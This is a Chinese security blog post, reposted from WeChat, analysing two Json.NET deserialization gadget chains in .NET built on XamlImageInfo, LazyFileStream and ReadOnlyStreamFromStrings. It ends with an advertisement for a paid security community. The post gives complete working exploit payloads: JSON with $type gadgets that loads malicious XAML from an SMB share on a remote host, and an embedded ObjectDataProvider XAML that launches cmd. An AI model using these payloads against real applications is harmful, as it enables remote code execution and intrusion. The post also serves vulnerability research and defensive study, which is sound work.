> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/E6RRQr7SjAWJSGTnSK_RXw)

0x01 基本介绍
=========

XamlImageInfo 类属于命名空间 System.Activities.Presentation.Internal，通常用于 WPF 处理与图像和图标相关的功能。本次更新的 gadget 存在两条不同的攻击链路，第 1 条链路优势在于系统默认的 GAC 程序集，但缺点在于需要从 SMB 路径加载，第 2 条链路优势在于无需加载 SMB 协议文件路径，但明显的缺点在于 Microsoft.Web.Deployment 不属于系统默认的程序集，需要额外安装 Web 服务或者 VisualStudio、NuGet 包才能获取。

0x02 链路 1 分析
============

XamlImageInfo
-------------

该类有一个构造函数 XamlImageInfo(Stream stream)，定义如下

```
private class XamlImageInfo : ManifestImages.ImageInfo
{
  public XamlImageInfo(Stream stream)
  {
    this._image = XamlReader.Load(stream);
  }
}

```

由于是构造函数，实例化时会被自动调用，函数内部通过 XamlReader.Load 方法可以加载任意 XAML，因此只需要控制 Stream 流的内容便可以实现执行任意命令。

LazyFileStream

事实上 Stream 是一个抽象类，用于表示数据流，在研究 GAC 全局程序集缓存时，发现 LazyFileStream 这个类满足上述条件的类，它扩展了 Stream 类并具有与 Json.NET 兼容的反序列化能力。LazyFileStream 位于 Microsoft.Build.Tasks.Windows 命名空间，

![](https://mmbiz.qpic.cn/mmbiz_png/NO8Q9ApS1YicBoAibX3RP7I4H1Bw5lthqNEZ7Jsl3VwxZX9aKqQYwY6pNO5N8NKSvZR7xhf6GRnhbSGxVQLs1V2Q/640?wx_fmt=png)

构造函数内部成员 _sourcePath 被设置为攻击者控制的路径，然后创建了一个 FileStream 对象，并通过 Read 方法允许访问数据，这些数据包括可通过远程 SMB 协议加载恶意的 XAML 文件。

漏洞复现

首先在远程主机 192.168.101.86 创建恶意 XAML 文件 XamlImageInfo.xaml，

![](https://mmbiz.qpic.cn/mmbiz_png/NO8Q9ApS1YicBoAibX3RP7I4H1Bw5lthqNU7WRhsddBib3R2AL6g7y3VCiafAY3AWmq6EicbXhCyNl9ZYxItz1HYXCg/640?wx_fmt=png)

然后使用 Json.NET 进行反序列化，允许在 JSON 数据中包含 $type 属性，代码实现如下

```
var s5 = "{'$type':'System.Activities.Presentation.Internal.ManifestImages+XamlImageInfo, System.Activities.Presentation, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35',\r\n    'stream':{\r\n        '$type':'Microsoft.Build.Tasks.Windows.ResourcesGenerator+LazyFileStream, PresentationBuildTasks, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35','path':'\\\\\\\\192.168.101.86\\\\Poc\\\\XamlImageInfo.xaml'\r\n    }\r\n}";
JsonConvert.DeserializeObject(s5, new JsonSerializerSettings
{
    TypeNameHandling = TypeNameHandling.All
});

```

调用 XamlImageInfo 和 LazyFileStream 这两条链加载远程主机 192.168.101.86 共享提供的恶意的 XAML，运行后成功启动本地计算器进程，如下图所示

![](https://mmbiz.qpic.cn/mmbiz_png/NO8Q9ApS1YicBoAibX3RP7I4H1Bw5lthqNeqogicHZocXr69pEvbNTiblu45dnCuVjxvOOdOj7Rqib8mG1a3VHC0omQ/640?wx_fmt=png)

0x03 链路 2 分析
============

ReadOnlyStreamFromStrings 类是微软 Web 部署工具中的一个类，位于命名空间 Microsoft.Web.Deployment，用于处理部署 Web 应用程序的配置、内容和其他资源发布时的数据流。

该类有一个构造函数 ReadOnlyStreamFromStrings(IEnumerator<string> enumerator, string stringSuffix)，接受一个 enumerator 字符串迭代器和一个 stringSuffix 字符串后缀作为参数，而且继承于 Stream 类，并基本上重写了所有的 Stream 方法，因此可以视为此类和 Stream 类基本一样。定义如下图所示

![](https://mmbiz.qpic.cn/mmbiz_png/NO8Q9ApS1YicBoAibX3RP7I4H1Bw5lthqNAtiaqhS4DjGNrPzjJCew5r1cXA06pMIEZtDv6LjqFRk0HHQkBpniaq9w/640?wx_fmt=png)

方法内部调用名为 StringAsBufferEnumerator 的私有类，该类通过 Current 属性获取当前迭代的字节数据，而这些数据来源自将外部传递的 stringSuffix 字符串数据，这里通过 Encoding.UTF8.GetBytes 实现字符串到字节的转换，如下图所示

![](https://mmbiz.qpic.cn/mmbiz_png/NO8Q9ApS1YicBoAibX3RP7I4H1Bw5lthqN2nbiaMhhpic6hicbJuK5c5mgNibdiakbnkSULic4ad6HyQBaxkOZdUU5p3AA/640?wx_fmt=png)

因此反序列化时只需满足一个迭代器 enumerator 类型，具体来说，我们需要提供一个实现 IEnumerator<string> 接口的类，这个 IEnumerator<string> 类可以是任何实现该接口的类，比如 Microsoft.WebDeployment.GroupedIEnumerable<T>，然后我们只需要将攻击载荷赋予成员 stringSuffix 即可。

下面通过编码实践复现基于 ReadOnlyStreamFromStrings 链完成的 JSON.NET 反序列化漏洞，具体代码如下

```
var s5 = "{'$type':'System.Activities.Presentation.Internal.ManifestImages+XamlImageInfo, System.Activities.Presentation, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35',\r\n    'stream':{\r\n    '$type':'Microsoft.Web.Deployment.ReadOnlyStreamFromStrings, Microsoft.Web.Deployment, Version=9.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35',\r\n'enumerator':{\r\n        '$type':'Microsoft.Web.Deployment.GroupedIEnumerable`1+GroupEnumerator[[System.String, mscorlib]], Microsoft.Web.Deployment, Version=9.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35',\r\n'enumerables':\r\n[\r\n{\r\n '$type':'System.Collections.Generic.List`1[[System.String, mscorlib]], mscorlib',\r\n'$values':['']\r\n }\r\n ]\r\n },\r\n'stringSuffix':'<?xml version=\"1.0\" encoding=\"utf-8\"?>\r\n<ObjectDataProvider MethodName=\"Start\" IsInitialLoadEnabled=\"False\" xmlns=\"http://schemas.microsoft.com/winfx/2006/xaml/presentation\" xmlns:sd=\"clr-namespace:System.Diagnostics;assembly=System\" xmlns:x=\"http://schemas.microsoft.com/winfx/2006/xaml\">\r\n  <ObjectDataProvider.ObjectInstance>\r\n    <sd:Process>\r\n      <sd:Process.StartInfo>\r\n        <sd:ProcessStartInfo Arguments=\"/c calc\" StandardErrorEncoding=\"{x:Null}\" StandardOutputEncoding=\"{x:Null}\" UserName=\"\" Password=\"{x:Null}\" Domain=\"\" LoadUserProfile=\"False\" FileName=\"cmd\" />\r\n      </sd:Process.StartInfo>\r\n    </sd:Process>\r\n  </ObjectDataProvider.ObjectInstance>\r\n</ObjectDataProvider>'\r\n    }\r\n}\r\n";
JsonConvert.DeserializeObject(s5, new JsonSerializerSettings
{
    TypeNameHandling = TypeNameHandling.All
});

```

![](https://mmbiz.qpic.cn/mmbiz_png/NO8Q9ApS1YicBoAibX3RP7I4H1Bw5lthqNjNd8jdVL1nE1o5kpXG148NZXrSNWb6It2Dk2vv4OVWvgIEsqp4Ij4w/640?wx_fmt=png)

相比较第 1 条链路来说，优势在于无需加载 SMB 协议文件路径，但明显的缺点在于 Microsoft.Web.Deployment 不属于系统默认的程序集，需要额外安装 Web 服务或者 VisualStudio、NuGet 包才能获取

欢迎加入星球
======

为了更好地应对基于. NET 技术栈的风险识别和未知威胁，dotNet 安全矩阵星球从创建以来一直聚焦于. NET 领域的安全攻防技术，定位于高质量安全攻防星球社区，也得到了许多师傅们的支持和信任，通过星球深度连接入圈的师傅们，一起推动. NET 安全高质量的向前发展。经过运营团队成员商议一致同意给到师傅们最大优惠力度，**只需 129 元就可以加入我们。**

星球汇聚了各行业安全攻防技术大咖，并且每日分享. NET 安全技术干货以及交流解答各类技术等问题，社区中发布**很多高质量的. NET** 安全资源，可以说市面上很少见，都是干货。其中主题包括**.NET Tricks、漏洞分析、内存马、代码审计、预编译、反序列化、webshell 免杀、命令执行、C# 工具库**等等，后续还会倾力打造**专刊、视频**等配套学习资源，循序渐进的方式引导加深安全攻防技术提高以及岗位内推等等服务。

![](https://mmbiz.qpic.cn/mmbiz_png/NO8Q9ApS1Y8DlZsGiaRRGghficKFQt58Ueoynsb0my3uzMAb7VwM5bgtnb4nbl4c9xdEjGraUXic6pO0p38xmWiaRQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)![](https://mmbiz.qpic.cn/mmbiz_png/NO8Q9ApS1YibHErRN3IhgSaicia7Rl5SF0plpcuicd0KG8Cn7vGczlBRtvSJvicWejH7TOro6AGLQ627SvVzxzBnphg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)![](https://mmbiz.qpic.cn/mmbiz_png/NO8Q9ApS1Y8DlZsGiaRRGghficKFQt58UeoxTMuRezdHEJu6Hp08Xgm2F49cyBI1zlcj5XqLJK8zedWlUjibYmia3g/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)![](https://mmbiz.qpic.cn/mmbiz_png/NO8Q9ApS1Y9y0BnibYCn1b9GMKqxd1Z5A1DLLJ9YxZeCn52XA1Kw7T5ibWCv89ZXpGjPOY7hXBDRVwNdKbMLZR3A/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)![](https://mmbiz.qpic.cn/mmbiz_jpg/NO8Q9ApS1Y9feCUqrmRUUUMCjqQ7MG3YscC6oKrO2kc3qL0lda2b66pRicoNibOtaiafk7DsDMRPSFSp5SYuNUAvg/640?wx_fmt=jpeg&wxfrom=5&wx_lazy=1&wx_co=1)